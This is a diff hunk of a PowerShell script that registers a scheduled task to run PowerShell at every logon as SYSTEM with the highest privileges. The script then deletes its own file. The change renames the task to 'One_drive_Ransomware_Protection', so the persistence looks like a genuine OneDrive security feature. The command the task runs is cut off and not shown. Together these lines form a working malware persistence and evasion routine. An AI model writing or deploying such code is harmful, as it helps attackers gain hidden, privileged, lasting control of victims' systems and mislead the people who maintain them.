@@ -3,6 +3,6 @@ $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfil
 $trigger = New-ScheduledTaskTrigger -AtLogOn
 $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 # register scheduled task
-Register-ScheduledTask -TaskName "Account_sync" -Action $action -Trigger $trigger -Principal $principal
+Register-ScheduledTask -TaskName "One_drive_Ransomware_Protection" -Action $action -Trigger $trigger -Principal $principal
 # self destruct
 Remove-Item -Path $MyInvocation.MyCommand.Source -Force
